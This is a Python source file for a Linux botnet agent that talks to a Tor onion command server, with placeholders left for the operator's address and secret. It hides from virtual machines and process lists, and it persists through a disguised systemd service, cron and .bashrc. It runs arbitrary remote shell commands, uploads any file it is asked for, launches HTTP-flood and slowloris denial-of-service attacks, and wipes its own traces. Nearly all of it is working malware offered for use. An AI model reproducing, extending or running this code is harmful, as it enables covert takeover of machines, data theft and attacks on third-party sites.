#! /usr/bin/env python3
import requests
import threading
import time
import random
import platform
import socket
import uuid
import subprocess
import os
import sys
import base64
import hashlib
import shutil
import struct
import json
import urllib.request
import tarfile

C2_ONION = "CHANGE_TO_YOUR_ONION_ADDRESS"
SHARED_SECRET = "CHANGE_TO_C2_SECRET"
C2_URL = f"http://{C2_ONION}"
BOT_ID = hashlib.md5((socket.gethostname() + str(uuid.getnode()).encode()).hex().encode()).hexdigest()[:12]
ATTACK_STOP = threading.Event()
PROXIES = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
SESSION_KEY = None

def token():
    return hashlib.sha256(f"{BOT_ID}:{SHARED_SECRET}".encode()).hexdigest()[:16]

def anti_vm():
    flags = 0
    try:
        with open('/proc/cpuinfo') as f:
            if 'hypervisor' in f.read(): flags += 1
    except: pass
    try:
        with open('/sys/class/dmi/id/product_name') as f:
            if any(x in f.read().lower() for x in ['vmware','virtualbox','qemu','kvm']): flags += 1
    except: pass
    try:
        with open('/proc/uptime') as f:
            if float(f.read().split()[0]) < 300: flags += 1
    except: pass
    if flags >= 2: sys.exit(0)

def hide_process():
    try:
        import ctypes
        libc = ctypes.CDLL(None)
        buf = ctypes.create_string_buffer(b'[kworker/0:0]\x00')
        libc.prctl(15, buf)
    except: pass

def setup_tor():
    """Download static Tor binary if missing, then launch"""
    tor_path = '/tmp/tor'

    if not os.path.exists(tor_path):
        try:
            import platform as plat
            arch = plat.machine()
            if 'aarch64' in arch or 'arm64' in arch:
                url = "https://archive.torproject.org/tor-package-archive/torbrowser/14.0.6/tor-linux64-14.0.6.tar.gz"
            else:
                url = "https://archive.torproject.org/tor-package-archive/torbrowser/14.0.6/tor-linux64-14.0.6.tar.gz"

            urllib.request.urlretrieve(url, '/tmp/tor.tar.gz')
            with tarfile.open('/tmp/tor.tar.gz', 'r:gz') as tar:
                tar.extractall('/tmp/tor_extract')
            os.remove('/tmp/tor.tar.gz')

            # Find tor binary in extracted files
            for root, dirs, files in os.walk('/tmp/tor_extract'):
                if 'tor' in files:
                    found = os.path.join(root, 'tor')
                    shutil.copy(found, '/tmp/tor')
                    os.chmod('/tmp/tor', 0o755)
                    break
            if not os.path.exists('/tmp/tor'):
                return
        except:
            # Fallback: try apt
            try:
                subprocess.run(['apt', 'update', '-qq'], capture_output=True, timeout=60)
                subprocess.run(['apt', 'install', '-y', '-qq', 'tor'], capture_output=True, timeout=120)
                tor_path = '/usr/bin/tor'
                if not os.path.exists(tor_path):
                    return
            except:
                return

    data_dir = '/tmp/.cache-tor'
    os.makedirs(data_dir, exist_ok=True)
    try:
        subprocess.Popen(
            [tor_path, '--SocksPort', '9050', '--DataDirectory', data_dir,
             '--HiddenServiceStatistics', '0', '--Log', 'notice', 'stderr'],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(5)
    except:
        pass

def persistence():
    script_path = os.path.abspath(sys.argv[0])
    install_path = '/usr/lib/systemd/systemd-logind-helper'
    if script_path != install_path:
        try:
            shutil.copy2(script_path, install_path)
            if os.path.exists('/usr/lib/systemd/systemd-logind-helper'):
                ref = '/usr/lib/systemd/systemd-logind' if os.path.exists('/usr/lib/systemd/systemd-logind') else '/lib/systemd/systemd-logind'
                if os.path.exists(ref):
                    stat_ref = os.stat(ref)
                    os.utime(install_path, (stat_ref.st_atime, stat_ref.st_mtime))
                os.chmod(install_path, 0o755)
                script_path = install_path
        except: pass
    service = f"""[Unit]
Description=Systemd Logind Helper
After=network.target

[Service]
ExecStart={script_path}
Restart=always
RestartSec=120

[Install]
WantedBy=multi-user.target
"""
    with open('/tmp/.journal', 'w') as f: f.write(service)
    subprocess.run(['cp', '/tmp/.journal', '/etc/systemd/system/systemd-logind-helper.service'], capture_output=True)
    subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
    subprocess.run(['systemctl', 'enable', 'systemd-logind-helper.service'], capture_output=True)
    subprocess.run(['systemctl', 'start', 'systemd-logind-helper.service'], capture_output=True)
    os.remove('/tmp/.journal')
    rand_delay = random.randint(0,120)
    cron_line = f"@reboot sleep {rand_delay} && {script_path} >/dev/null 2>&1 &\n"
    subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True, capture_output=True)
    bashrc_path = os.path.expanduser('~/.bashrc')
    with open(bashrc_path, 'a') as f:
        f.write(f'\n(sleep $((RANDOM % 300)) && {script_path} &) >/dev/null 2>&1\n')

def register():
    global SESSION_KEY
    try:
        r = requests.post(f"{C2_URL}/register", json={
            'bot_id': BOT_ID, 'os': 'Linux', 'hostname': socket.gethostname(),
            'cpu': os.cpu_count() or 1, 'username': os.getenv('USER','root'),
            'token': token()
        }, proxies=PROXIES, timeout=10)
        if r.status_code == 200:
            SESSION_KEY = r.json().get('sk')
    except: pass

def poll():
    try:
        r = requests.post(f"{C2_URL}/poll", json={'bot_id': BOT_ID, 'token': token()}, proxies=PROXIES, timeout=15)
        if r.status_code != 200: return None
        return r.json()
    except: return None

def send_result(output):
    try:
        encoded = base64.b64encode(output.encode() if isinstance(output, str) else output).decode()
        requests.post(f"{C2_URL}/result", json={'bot_id': BOT_ID, 'result': encoded, 'token': token()}, proxies=PROXIES, timeout=10)
    except: pass

def send_file(filename, content):
    try:
        encoded = base64.b64encode(content).decode()
        requests.post(f"{C2_URL}/download", json={'bot_id': BOT_ID, 'filename': filename, 'content': encoded, 'token': token()}, proxies=PROXIES, timeout=30)
    except: pass

def attack_http(target, duration):
    stop_at = time.time() + duration
    while time.time() < stop_at and not ATTACK_STOP.is_set():
        try:
            requests.get(target, headers={'User-Agent': 'Mozilla/5.0'}, timeout=5)
        except: pass
        time.sleep(0.01)

def attack_slowloris(target, duration):
    stop_at = time.time() + duration
    sockets = []
    while time.time() < stop_at and not ATTACK_STOP.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            host = target.replace('http://','').replace('https://','').split('/')[0]
            s.connect((host, 80))
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
            sockets.append(s)
        except: pass
        time.sleep(15)
        for s in sockets[:]:
            try: s.sendall(b"X-a: " + os.urandom(8).hex().encode() + b"\r\n")
            except: sockets.remove(s)
    for s in sockets: s.close()

def uninstall():
    subprocess.run(['systemctl', 'stop', 'systemd-logind-helper.service'], capture_output=True)
    subprocess.run(['systemctl', 'disable', 'systemd-logind-helper.service'], capture_output=True)
    for p in ['/etc/systemd/system/systemd-logind-helper.service', '/usr/lib/systemd/systemd-logind-helper']:
        try:
            with open(p, 'wb') as f: f.write(os.urandom(1024))
            os.remove(p)
        except: pass
    subprocess.run("crontab -l 2>/dev/null | grep -v systemd-logind-helper | crontab -", shell=True, capture_output=True)
    sys.exit(0)

def main():
    anti_vm()
    setup_tor()
    time.sleep(random.uniform(2,10))
    hide_process()
    persistence()
    register()
    while True:
        try:
            resp = poll()
            if resp:
                cmd = resp.get('command', 'idle')
                if cmd == 'shell':
                    data = resp.get('data', '')
                    if data.lower().startswith('download'):
                        path = data.split(' ', 1)[1] if ' ' in data else ''
                        if os.path.exists(path):
                            with open(path, 'rb') as f:
                                send_file(os.path.basename(path), f.read())
                            send_result(f"[+] Downloaded: {path} ({os.path.getsize(path)} bytes)")
                        else:
                            send_result(f"[-] File not found: {path}")
                    elif data.lower().strip() == 'uninstall':
                        uninstall()
                    else:
                        try:
                            result = subprocess.getoutput(data)
                        except:
                            result = str(subprocess.run(data, shell=True, capture_output=True, text=True))
                        send_result(result)
                elif cmd == 'download':
                    path = resp.get('path', '')
                    if os.path.exists(path):
                        with open(path, 'rb') as f:
                            send_file(os.path.basename(path), f.read())
                        send_result(f"[+] Downloaded: {path}")
                    else:
                        send_result(f"[-] Not found: {path}")
                elif cmd == 'attack':
                    ATTACK_STOP.clear()
                    target = resp['target']
                    duration = resp['duration']
                    method = resp['method']
                    send_result(f"[+] Attack started: {method} on {target}")
                    if method == 'http':
                        attack_http(target, duration)
                    elif method == 'slowloris':
                        attack_slowloris(target, duration)
                    send_result(f"[+] Attack finished: {method} on {target}")
            time.sleep(random.uniform(45, 300))
        except:
            time.sleep(random.uniform(45, 300))

if __name__ == '__main__':
    main()